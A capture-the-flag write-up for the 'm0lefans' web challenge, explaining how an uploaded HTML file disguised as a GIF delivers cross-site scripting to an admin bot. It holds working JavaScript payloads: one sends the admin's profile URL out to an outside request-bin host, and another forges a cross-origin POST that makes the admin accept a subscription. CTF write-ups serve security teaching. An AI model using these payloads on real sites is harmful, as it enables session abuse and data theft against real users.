m0lefans
---

The task is a form of a blog, where users can share the photos of their fans.

There also is a route for reporting any url to the admin, and this is a first sign of an XSS task.

After trying to upload numerous files we've successfully uploaded a html file. All the following JS code snippets
are inserted in the html file, uploaded to a post & the direct link is sent to admin:

```html
GIF89a;
<html>
<head></head>
<body>
    <script>
    	// code goes here
    </script>
</body>
</html>
```

The site provides the functionality to subscribe to another user's posts. After the target user approves the request,
the subscriber can read all the private posts, therefore we need to subscribe to the admin user somehow. 

First, we need to leak the admin's subdomain. It's possible using the feed, which is on the same subdomain as our html 
page with XSS, as there's a link to the user's profile. The following snipped does the trick:

```js
fetch(
    "https://m0lecon.fans/feed/", 
    {method: "GET", mode: "cors", credentials: "include"},
).then(
    resp => {
        resp.text().then(
            content => { 
                console.log(content);
                let match = content.match(/https:\/\/[a-zA-Z0-9-]*\.m0lecon\.fans\/profile\//);
                console.log(match);
                fetch(
                    "https://pomo-mondreganto.me/request_bin/bin/ac108ee7a0?q=" + btoa(JSON.stringify(match)), 
                    {method: "GET", mode: "no-cors"},
                );
            },
        );
    },
);
```

This yields admin's profile link: `https://y0urmuchb3l0v3d4dm1n.m0lecon.fans/profile/`, allowing us to make a 
subscription request.

Now it's time for the main part -- making the admin accept our request. To do so we need to make a POST request to 
admin's profile subdomain with the only argument in the form -- the user's ID. To acquiure the ID, once can register 
another account, make a friend request from the first account to the second and look at the form send when accepting 
the request. It's worth mentioning that the request is between the different domains, so we must use `mode: "no-cors"`
and we can't get the response (not that we need it anyway).

The final snippet for accepting the user's request is (in my case the id was 4):

```js
fetch("https://y0urmuchb3l0v3d4dm1n.m0lecon.fans/profile/request", {
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    method: "POST",
    mode: "no-cors",
    body: "id=4",
    credentials: "include"
});
```

After reporting that, we can visit the admin's profile and get the flag from the first post: `ptm{m4k3_CSP_r3ports_gr3a7_4gain!}`.
